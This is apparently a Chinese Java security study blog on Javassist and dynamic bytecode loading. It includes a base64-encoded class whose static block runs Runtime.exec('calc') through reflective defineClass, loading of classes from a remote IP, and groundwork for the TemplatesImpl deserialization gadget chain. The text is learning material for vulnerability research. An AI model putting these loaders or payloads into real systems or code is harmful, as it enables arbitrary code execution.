makeClassInitializer()：制作一个空的类初始化程序（静态构造函数）。 Class x.toClass()：将Ctclass类型的字节码转换成Class类型。 CtMethod/CtField 其实这三个可以理解为加强版Class/method/field对象。同样可以使用CtClass中的CtField和CtMethod来获取类对象中的字段和方法。\nMaven 在一个项目中，想要使用就需要加依赖，\n在POM.XML中添加如下代码即可（注意依赖的版本）：\n1 2 3 4 5 6 7 //这样才能使用javassist \u0026lt;!-- https://mvnrepository.com/artifact/org.javassist/javassist --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.javassist\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.28.0-GA\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 读取类/成员变量/方法信息的代码 使用ClassPool对象获取到CtClass对象后就可以像使用Java反射API一样去读取类信息了。最终在maven项目中的测试代码如下：\nTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package org.example; public class Test{ private String name; protected char yn; public int age; public void setAge(int age){ this.age = age; } protected int getAge(){ return this.age; } public Test(String name,char yn,int age){ this.age = age; this.yn = yn; this.name = name; } private String getName(){ return this.name; } } 获取的操作：\nMain.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 package org.example; import javassist.ClassPool; import javassist.CtClass; import javassist.CtField; import javassist.CtMethod; import javassist.CtConstructor; public class Main{ public static void main(String[] args) throws Exception{ //获取ClassPool对象 ClassPool classPool = ClassPool.getDefault(); System.out.println(\u0026#34;1:\u0026#34;+classPool); //获取CtClass对象 CtClass ctClass = classPool.getCtClass(\u0026#34;org.example.Test\u0026#34;);//这里get()等同于getClass() System.out.println(\u0026#34;2:\u0026#34;+ctClass); //获取CtField属性 CtField[] ctField = ctClass.getDeclaredFields(); for(CtField x : ctField){ System.out.println(\u0026#34;3:\u0026#34;+x); } //获取CtMethod方法 CtMethod[] ctMethod = ctClass.getDeclaredMethods(); for(CtMethod x : ctMethod){ System.out.println(\u0026#34;4:\u0026#34;+x); } //获取CtConStructor构造方法 CtClass[] parameters = new CtClass[]{ classPool.get(\u0026#34;java.lang.String\u0026#34;), CtClass.charType, CtClass.intType }; CtConstructor ctConstructor = ctClass.getDeclaredConstructor(parameters); System.out.println(\u0026#34;5:\u0026#34;+ctConstructor); } } 输出为：\n1 2 3 4 5 6 7 8 9 1:[class path: java.lang.Object.class;] 2:javassist.CtClassType@5caf905d[public class org.example.Test fields=org.example.Test.name:Ljava/lang/String;, org.example.Test.yn:C, org.example.Test.age:I, constructors=javassist.CtConstructor@3d494fbf[public Test (Ljava/lang/String;CI)V], methods=javassist.CtMethod@3ac68cb[public setAge (I)V], javassist.CtMethod@7424e08a[protected getAge ()I], javassist.CtMethod@26562bc2[private getName ()Ljava/lang/String;], ] 3:org.example.Test.name:Ljava/lang/String; 3:org.example.Test.yn:C 3:org.example.Test.age:I 4:javassist.CtMethod@3ac68cb[public setAge (I)V] 4:javassist.CtMethod@7424e08a[protected getAge ()I] 4:javassist.CtMethod@26562bc2[private getName ()Ljava/lang/String;] 5:javassist.CtConstructor@3d494fbf[public Test (Ljava/lang/String;CI)V] 注意看读取代码这里的细节。与反射对比，尤其是对于函数参数类型的改变。\n修改类方法 只需要调用CtMethod类的对应的API，CtMethod提供了类方法修改的API，如：\nsetModifiers：可修改类的访问修饰符，\ninsertBefore和insertAfter：能够实现在类方法执行的前后插入任意的Java代码片段，\nsetBody ：可以修改整个方法的代码等。\nsetName：修改方法名\nTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package org.example; public class Test{ private String name; protected char yn; public int age; public void setAge(int age){ this.age = age; } protected int getAge(){ return this.age; } public Test(String name,char yn,int age){ this.age = age; this.yn = yn; this.name = name; } private String getName(){ return this.name; } } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package org.example; import javassist.ClassPool; import javassist.CtMethod; import javassist.CtClass; public class Main{ public static void main(String[] args) throws Exception { ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.getCtClass(\u0026#34;org.example.Test\u0026#34;); //修改整个代码块 CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;getAge\u0026#34;); ctMethod.setBody(\u0026#34;{return \\\u0026#34;haha\\\u0026#34; ;}\u0026#34;); //修改部分，看代码结构 CtMethod ctMethod1 = ctClass.getDeclaredMethod(\u0026#34;setAge\u0026#34;,new CtClass[]{CtClass.intType}); ctMethod1.insertBefore(\u0026#34;System.out.println(\\\u0026#34;before is\\\u0026#34;);\u0026#34;); CtMethod ctMethod2 = ctClass.getDeclaredMethod(\u0026#34;getName\u0026#34;); ctMethod2.insertAfter(\u0026#34;System.out.println(\\\u0026#34;after is\\\u0026#34;);\u0026#34;); //输出修改后的字节码到文件，方便看结果 ctClass.writeFile(\u0026#34;output\u0026#34;);//落地的是class文件 } } 现在来看看修改后时什么，结果如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 //Test.class package org.example; public class Test { private String name; protected char yn; public int age; public void setAge(int age) { System.out.println(\u0026#34;before is\u0026#34;); this.age = age; } protected int getAge() { return (int)\u0026#34;haha\u0026#34;; } public Test(String name, char yn, int age) { this.age = age; this.yn = yn; this.name = name; } private String getName() { String var2 = this.name; System.out.println(\u0026#34;after is\u0026#34;); return var2; } } 可以对比一下之前的Test.java看看结果。\n动态创建一个类 API提供相应的make方法实现的操作\n看下面的代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 package org.example; import javassist.ClassPool; import javassist.CtClass; import javassist.CtField; import javassist.CtMethod; public class Main { public static void main(String[] args) { try { // 创建ClassPool对象 ClassPool classPool = ClassPool.getDefault(); // 使用ClassPool创建一个新的类 CtClass ctClass = classPool.makeClass(\u0026#34;org.example.haha\u0026#34;); // 创建类成员变量content CtField ctField = CtField.make(\u0026#34;private static String content = \\\u0026#34;Hello world~\\\u0026#34;;\u0026#34;, ctClass); // 将成员变量添加到ctClass对象中 ctClass.addField(ctField); // 创建一个主方法并输出content对象值 CtMethod ctMethod = CtMethod.make( \u0026#34;public static void main(String[] args) { System.out.println(content); }\u0026#34;, ctClass ); // 将成员方法添加到ctClass对象中 ctClass.addMethod(ctMethod); //根据包结构创建目录并生成文件 ctClass.writeFile(\u0026#34;output\u0026#34;); } catch (Exception e) { e.printStackTrace(); } } } 很清楚，理解学习一下代码就行了，建议在学习后自己敲一遍。\n随后就生成了haha.class\n内容为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package org.example; public class haha { private static String content = \u0026#34;Hello world~\u0026#34;; public static void main(String[] var0) { System.out.println(content); } public haha() { } } 一般具体使用的时候会利用到static语句块，简单构造一下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; import javassist.*; public class Main { public static void main(String[] args) throws Exception { ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.makeClass(\u0026#34;haha\u0026#34;); CtField ctField = CtField.make(\u0026#34;private String content = \\\u0026#34;111\\\u0026#34;;\u0026#34;, ctClass); ctClass.addField(ctField); CtMethod ctMethod = CtMethod.make(\u0026#34;public String getContent(){ return this.content;}\u0026#34;, ctClass); ctClass.addMethod(ctMethod); CtConstructor ctConstructor = ctClass.makeClassInitializer(); ctConstructor.insertBefore(\u0026#34;System.out.println(\\\u0026#34;123\\\u0026#34;);\u0026#34;); ctClass.writeFile(\u0026#34;output\u0026#34;); Class clazz = ctClass.toClass(); clazz.getDeclaredConstructor().newInstance(); } } 成功在公职太输出 123。\n生成的haha.class文件内容为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // public class haha { private String content = \u0026#34;111\u0026#34;; public String getContent() { return this.content; } static { System.out.println(\u0026#34;123\u0026#34;); } public haha() { } } 其实还有其他的API可以用来构造一个类以及类中的各种属性，但这里就不多说了。\n也可以利用二进制来动态创建，如下：\n但是这个需要在项目中添加依赖\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-io\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-io\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.8.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 然后再运行下面这个代码即可\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 package org.example; import javassist.ClassPool; import javassist.CtClass; import javassist.CtField; import javassist.CtMethod; import org.apache.commons.io.FileUtils; import java.io.File; import java.util.Arrays; public class Main { public static void main(String[] args) { try { // 创建ClassPool对象 ClassPool classPool = ClassPool.getDefault(); // 使用ClassPool创建一个新的类 CtClass ctClass = classPool.makeClass(\u0026#34;org.example.haha\u0026#34;); // 创建类成员变量content CtField ctField = CtField.make(\u0026#34;private static String content = \\\u0026#34;Hello world~\\\u0026#34;;\u0026#34;, ctClass); // 将成员变量添加到ctClass对象中 ctClass.addField(ctField); // 创建一个主方法并输出content对象值 CtMethod ctMethod = CtMethod.make( \u0026#34;public static void main(String[] args) { System.out.println(content); }\u0026#34;, ctClass ); // 将成员方法添加到ctClass对象中 ctClass.addMethod(ctMethod); // 使用类CtClass，生成类二进制 byte[] bytes = ctClass.toBytecode(); // 输出二进制数据到控制台 System.out.println(Arrays.toString(bytes)); // 将class二进制内容写入到类文件 File classFilePath = new File(new File(System.getProperty(\u0026#34;user.dir\u0026#34;), \u0026#34;maven_text/output/org/example\u0026#34;), \u0026#34;haha.class\u0026#34;); FileUtils.writeByteArrayToFile(classFilePath, bytes); // 将生成的类写入文件系统 ctClass.writeFile(\u0026#34;output\u0026#34;); } catch (Exception e) { e.printStackTrace(); } } } 看一看代码理解一下。\n然后生成如下目录结构：\nhaha.class的内容同上。\n有个点稍微说明一下，使用如下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package org.example; import javassist.*; public class Main { public static void main(String[] args) throws Exception{ ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.makeClass(\u0026#34;org.example.erqi\u0026#34;); CtField ctField = CtField.make(\u0026#34;public String name = \\\u0026#34;ahhaha\\\u0026#34;; \u0026#34;,ctClass); ctClass.addField(ctField); CtMethod ctMethod = CtMethod.make(\u0026#34;public void setName(String name){ this.name = name ;}\u0026#34;,ctClass); ctClass.addMethod(ctMethod); Class clazz = ctClass.toClass(); System.out.println(ctClass); System.out.println(clazz); } } 输出为：\n1 2 3 javassist.CtNewClass@67f89fa3[hasConstructor changed frozen public class org.example.erqi fields=org.example.erqi.name:Ljava/lang/String;, constructors=javassist.CtConstructor@4ac68d3e[public erqi ()V], methods=javassist.CtMethod@ab2416c4[public setName (Ljava/lang/String;)V], ] class org.example.erqi 细心的师傅可能都已经发现了，对于前面所有的用过的代码，我们的操作层面都是字节码，所以生成的文件都是class文件，可以理解一下这个输出结果。\n最后，既然我们都已经生成了.class文件，那么我们现在就可以利用很多方法了，比如动态加载字节码。注意思考。\n参考文章：\nhttps://cloud.tencent.com/developer/article/1815164\nhttps://blog.csdn.net/google20/article/details/144730353\nhttps://nivi4.notion.site/Java-Javassist-621beee2064a4494abe794843028449d\n","date":"2024-06-23T22:54:06+08:00","permalink":"https://fupanc-w1n.github.io/p/javassist/","title":"Javassist"},{"content":"动态加载字节码 字节码 Java字节码指的是JVM执行使用的一类指令，通常被存储在.class文件中。\n加载远程/本地文件 在前面类加载机制的学习中，正常情况下URLClassLoader是AppClassLoader的父类。\n通常情况下,Java会根据配置项sun.boot.class.path和java.class.path中列举的基础路径（这些路径是经过处理后的java.net.URL类）来寻找.class文件来加载，这个基础路径又分三种情况：\nURL未以斜杠/结尾，则认为是一个Jar文件，使用JarLoader来寻找类，即在Jar包上寻找类。 URL以/结尾，且协议名为file，则使用FileLoader来寻找类，即在本地系统中寻找.class文件 URL以斜杠/结尾，且协议名不为file，则使用最基础的Loader来寻找类 本地加载 .class 文件\n其实都是前面说过的了，主要是加载class文件，所以class文件不能有包名。\nReflection.java内容：\n1 2 3 4 5 6 7 public class Reflection { private String name = \u0026#34;fupanc\u0026#34;; public Reflection(){ System.out.println(\u0026#34;调用了Reflection的构造函数\u0026#34;); } } Main.java内容：\n1 2 3 4 5 6 7 8 9 10 11 12 package java_foundation; import java.net.URLClassLoader; import java.net.URL; public class Main { public static void main(String[] args) throws Exception{ URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;file://D:\\\\\u0026#34;)}); Class clazz = urlClassLoader.loadClass(\u0026#34;Reflection\u0026#34;); clazz.newInstance(); } } 可以先使用javac将Reflection.java打成Reflection.class然后放在D盘。\n我的maven项目是自动编译然后放在项目中的target目录下的，这里直接找就行。\n启动成功输出：\n1 调用了Reflection的构造函数 但是我发现可以如下加载：\n1 2 3 4 5 6 7 8 9 10 11 12 13 //这个Reflection类是有包名的 package java_foundation; import java.net.URLClassLoader; import java.net.URL; public class Main { public static void main(String[] args) throws Exception{ URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;file://D:\\\\\u0026#34;)}); Class clazz = urlClassLoader.loadClass(\u0026#34;java_foundation.Reflection\u0026#34;); clazz.newInstance(); } } 以此类推吧，对于class文件也不一定是必须没有包名，加载时加上软件包即可，后面就不补充了。\n远程加载 .class 文件\n其实都是差不多的，这里试一下远程加载自己vps上的class文件，但感觉应该不行，应该是有什么安全策略的。自己尝试编写一下\n1 2 3 4 5 6 7 8 9 10 11 12 package java_foundation; import java.net.URLClassLoader; import java.net.URL; public class Main { public static void main(String[] args) throws Exception{ URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;http://47.100.223.173/Reflection.class\u0026#34;)}); Class clazz = urlClassLoader.loadClass(\u0026#34;Reflection\u0026#34;); clazz.newInstance(); } } 然后将本地的Reflection.java文件删除，再来运行，发现报错如下:\n1 2 3 4 5 Exception in thread \u0026#34;main\u0026#34; java.lang.ClassNotFoundException: Reflection at java.net.URLClassLoader.findClass(URLClassLoader.java:381) at java.lang.ClassLoader.loadClass(ClassLoader.java:424) at java.lang.ClassLoader.loadClass(ClassLoader.java:357) at java_foundation.Main.main(Main.java:9) 可能是URL路径问题，这是我看了一下前面讲的基础路径，尝试一下用jar包呢，所以我将构建jar包的代码改成如下：\n1 2 3 4 5 public class MyTest{ public MyTest(){ System.out.println(\u0026#34;调用了远程url类的构造函数\u0026#34;); } } 然后传到服务器上即可，如下尝试：\n1 2 3 4 5 6 7 8 9 10 11 12 package java_foundation; import java.net.URLClassLoader; import java.net.URL; public class Main { public static void main(String[] args) throws Exception{ URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;http://47.100.223.173/jar_build.jar\u0026#34;)}); Class clazz = urlClassLoader.loadClass(\u0026#34;MyTest\u0026#34;); clazz.newInstance(); } } 成功调用并输出：\n1 调用了远程url类的构造函数 这样用符合基础路径的格式成功调用了远程的class代码。感觉利用点很大呢。\n利用defineClass()直接加载字节码 在之前的调试中，可以知道Java加载都需要经过：\n1 ClassLoader.loadClass -\u0026gt; ClassLoader.findClass -\u0026gt; ClassLoader.defineClass 其中：\nloadClass的作用是从已经加载的类缓存、父加载器等位置寻找类（双亲委派机制），在前面没有找到的情况下执行findClass findClass的作用就是根据基础URL制定的方式来查找类，读取字节码后交给defineClass defineClass的作用是处理前面传入的字节码，将其处理成真正的Java类 defineClass决定如何将一段字节流转换变成一个Java类，Java默认的ClassLoader.defineClass是一个native方法（C语言实现）：\n利用方法如下：\n利用反射获取defineClass方法\n1 2 3 4 5 6 7 8 import java.lang.reflect.Method; public class Main{ public static void main(String[] args){ Method method = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;,String.class,byte[].class, int.class, int.class); method.setAccessible(true); } } 此时Text.java内容为：\n1 2 3 4 5 6 7 8 9 10 11 12 import java.lang.Runtime; public class Text{ static{ try{ Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); }catch(Exception e){ System.out.println(\u0026#34;异常退出\u0026#34;); } } } //还是需要注意class文件要没有包名 将其转换为class文件后再转换为base64编码，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package java_foundation; import java.nio.file.*; import java.util.Base64; public class FileToBase64 { public static void main(String[] args) { String filePath = \u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Text.class\u0026#34;; // 请替换成你实际的文件路径 try { byte[] fileBytes = readFileToByteArray(filePath); String base64Encoded = encodeBase64(fileBytes); System.out.println(\u0026#34;Base64 Encoded Content:\u0026#34;); System.out.println(base64Encoded); } catch (Exception e) { e.printStackTrace(); } } public static byte[] readFileToByteArray(String filePath) throws Exception { return Files.readAllBytes(Paths.get(filePath)); } public static String encodeBase64(byte[] data) { return Base64.getEncoder().encodeToString(data); } } //也可以javac编译，然后cat输出是Base64编码一下，就是需要注意idea和javac运行的JDK版本要相同。 再使用base64解码就可以得到完整的字节码了，如下：\n1 byte[] code = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQAKgoACAAbCgAcAB0IAB4KABwAHwcAIAoABQAhBwAiBwAjAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMVGVzdDsBAAg8Y2xpbml0PgEAAXgBABNMamF2YS9sYW5nL1J1bnRpbWU7AQABeQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAgAQAKU291cmNlRmlsZQEACVRlc3QuamF2YQwACQAKBwAkDAAlACYBAARjYWxjDAAnACgBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAApAAoBAARUZXN0AQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAIAAQAJAAoAAQALAAAALwABAAEAAAAFKrcAAbEAAAACAAwAAAAGAAEAAAAEAA0AAAAMAAEAAAAFAA4ADwAAAAgAEAAKAAEACwAAAIEAAgACAAAAFrgAAksSA0wqK7YABFenAAhLKrYABrEAAQAAAA0AEAAFAAMADAAAAB4ABwAAAAcABAAIAAcACQANAAwAEAAKABEACwAVAA0ADQAAACAAAwAEAAkAEQASAAAABwAGABMAFAABABEABAAVABYAAAAXAAAABwACUAcAGAQAAQAZAAAAAgAa\u0026#34;); 加载字节码成Class对象，然后实例化拿到一个对象\n1 2 3 Class Test = (Class)method.invoke(ClassLoader.getSystemClassLoader(), \u0026#34;Test\u0026#34;, code, 0, code.length); Test.newInstance(); //ClassLoader.getSystemClassLoader()返回系统的类加载器对象 这里是因为defineClass()方法是一个实例方法。所以可以需要用一个实例对象即可，所以最终如下输出：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package java_foundation; import java.lang.ClassLoader; import java.util.Base64; import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception{ byte[] code = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQAMQoACgAZCgAaABsIABwKABoAHQcAHgkAHwAgCAAhCgAiACMHACQHACUBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABkxUZXh0OwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHAB4BAApTb3VyY2VGaWxlAQAJVGV4dC5qYXZhDAALAAwHACYMACcAKAEABGNhbGMMACkAKgEAE2phdmEvbGFuZy9FeGNlcHRpb24HACsMACwALQEADOW8guW4uOmAgOWHugcALgwALwAwAQAEVGV4dAEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEACQAKAAAAAAACAAEACwAMAAEADQAAAC8AAQABAAAABSq3AAGxAAAAAgAOAAAABgABAAAAAwAPAAAADAABAAAABQAQABEAAAAIABIADAABAA0AAABlAAIAAQAAABa4AAISA7YABFenAAxLsgAGEge2AAixAAEAAAAJAAwABQADAA4AAAAWAAUAAAAGAAkACQAMAAcADQAIABUACgAPAAAADAABAA0ACAATABQAAAAVAAAABwACTAcAFggAAQAXAAAAAgAY\u0026#34;); Method method = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;,String.class,byte[].class,int.class,int.class); method.setAccessible(true); Class clazz = (Class)method.invoke(ClassLoader.getSystemClassLoader(),\u0026#34;Text\u0026#34;,code,0,code.length); clazz.newInstance(); } } 成功弹出计算机。\n使用javac目录的话就需要注意JDK的版本问题，需要一致。\n在前面的POC中调用方法时是用的AppClassLoader实例，也是才知道原来这里返回的ClassLoader是一个实例，那么这里为什么这样用呢。大概想一下就可以知道，由于defineClass()方法是一个普通方法，所以当调用invoke()方法时需要一个实例，即需要一个ClassLoader的实例来调用它。这里就是用AppClassLoader类加载器来加载Text类，大概就是这个意思。\n————————\n同样的可以直接利用IO进行文件读取，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package java_foundation; import java.lang.ClassLoader; import java.lang.reflect.Method; import java.nio.file.Files; import java.nio.file.Paths; public class Main { public static void main(String[] args) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Text.class\u0026#34;)); Method method = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;,String.class,byte[].class,int.class,int.class); method.setAccessible(true); Class clazz = (Class)method.invoke(ClassLoader.getSystemClassLoader(),\u0026#34;Text\u0026#34;,code,0,code.length); clazz.newInstance(); } } 同时要想到这里既然可以利用defineClass()方法直接加载字节码，那么我们在自定义类加载器的时候也要想到这一点，也许就可以直接利用。\n在defineClass被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造函数，初始化代码才能被执行，而且即使我们将初始化代码放在类的static块中，在defineClass时也无法被直接调用到。所以，如果我们想要使用defineClass在目标机器上执行任意代码，需要想办法调用构造函数。\n一定要注意的是：由于系统的ClassLoader#defineClass是一个保护属性，所以我们不能直接在外部访问，必须使用反射的形式来调用。\n在实际场景中，因为defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我们常用的一个攻击链TemplateImpl的基石\n利用TemplatesImpl加载字节码 虽然大部分上层开发者不会直接使用到defineClass方法，但是Java底层还是有一些类用到了它，这就是TemplatesImpl。\ncom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl这个类中定义了一个内部类TransletClassLoader，源代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 static final class TransletClassLoader extends ClassLoader { private final Map\u0026lt;String,Class\u0026gt; _loadedExternalExtensionFunctions; TransletClassLoader(ClassLoader parent) { super(parent); _loadedExternalExtensionFunctions = null; } TransletClassLoader(ClassLoader parent,Map\u0026lt;String, Class\u0026gt; mapEF) { super(parent); _loadedExternalExtensionFunctions = mapEF; } public Class\u0026lt;?\u0026gt; loadClass(String name) throws ClassNotFoundException { Class\u0026lt;?\u0026gt; ret = null; if (_loadedExternalExtensionFunctions != null) { ret = _loadedExternalExtensionFunctions.get(name); } if (ret == null) { ret = super.loadClass(name); } return ret; } Class defineClass(final byte[] b) { return defineClass(null, b, 0, b.length); } } 这个类继承自ClassLoader类，并且重写了defineClass方法，是一个静态类，并且这里没有显示地声明其定义域，那么它的作用域就是default，可以被类外部调用。\n注意看它的defineClass()方法，和前面说的利用的defineClass调用的方法是一样的，这里可以尝试调用，但是这里是只传入了byte，应该也是可以利用的，本来这个重点应该就是字节码。\n那么现在从 TransletClassLoader#defineClass() 向前追溯一下调用链：\n1 2 3 TemplatesImpl#getOutputProperties() -\u0026gt; TemplatesImpl#newTransformer() -\u0026gt; TemplatesImpl#getTransletInstance() -\u0026gt; TemplatesImpl#defineTransletClasses() -\u0026gt; TransletClassLoader#defineClass() 那现在来跟一下这个调用链，从后往前。\n我们看TemplatesImpl#defineTransletClasses()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 private void defineTransletClasses() throws TransformerConfigurationException { if (_bytecodes == null) {//注意这里 ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); } TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); } }); try { final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount \u0026gt; 1) { _auxClasses = new HashMap\u0026lt;\u0026gt;(); } for (int i = 0; i \u0026lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]); final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex \u0026lt; 0) { ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } catch (ClassFormatError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name); throw new TransformerConfigurationException(err.toString()); } catch (LinkageError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } 几个比较关键的代码：\n1 2 3 4 5 6 7 8 9 10 11 TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); } }); +++++++ for (int i = 0; i \u0026lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]); 可以看到这里是调用了TransletClassLoader类的defineClass()方法，这里不就正好对应前面调用的方法了吗。\n然后看其他点：\n首先需要_bytecodes不等于null\n以及在这个TemplatesImpl类中的属性：\n否则是无法进行后面几步的。\n但是在TemplatesImpl类中，这个变量的定义如下：\n1 private byte[][] _bytecodes = null; 这里的_bytecodes定义为私有的并且没有其他方法可以直接修改它，在这里可以利用反射获取并修改那个变量。\n还有的其他需要注意的点，defineTransletClasses方法中会执行一个run方法：\n也就是之前说的实例化TransletClassLoader类的代码。这里为了防止报错所以_tfactory不能为空，来看一下TemplatesImple类中的_tfactory的初值：\n1 private transient TransformerFactoryImpl _tfactory = null; 可以看出来这里的变量_tfactory需要是一个TranformerFactoryImpl类型的数据，并且在run方法中要执行的就是_tfactory变量的方法。所以这里直接将这个_tfactory变量赋值为TransformerFactoryImpl类实例即可。\n现在继续看哪里使用过这个defineTransletClasses()方法，搜索一下，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 //第一个： private synchronized Class[] getTransletClasses() { try { if (_class == null) defineTransletClasses(); } catch (TransformerConfigurationException e) { // Falls through } return _class; } //第二个： public synchronized int getTransletIndex() { try { if (_class == null) defineTransletClasses(); } catch (TransformerConfigurationException e) { // Falls through } return _transletIndex; } //第三个(部分代码)： private Translet getTransletInstance() throws TransformerConfigurationException { try { if (_name == null) return null; if (_class == null) defineTransletClasses(); AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); ............... return translet; } catch (TransformerConfigurationException e) { // Falls through } } 第一个方法为私有，往上调用，没有什么方法使用过，那么就只有放弃。\n第二个方法为public，可以直接调用，但是有限制，后面会说。\n第三个方法向上调用发现有一个方法调用了，并且是一个public方法，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public synchronized Transformer newTransformer() throws TransformerConfigurationException { TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) { transformer.setURIResolver(_uriResolver); } if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) { transformer.setSecureProcessing(true); } return transformer; } 那么现在的思路就是实例化TemplatesImpl对象后直接调用它的方法就能直接使用。\n现在来看看使用的条件是什么，\n1 2 3 4 5 6 7 8 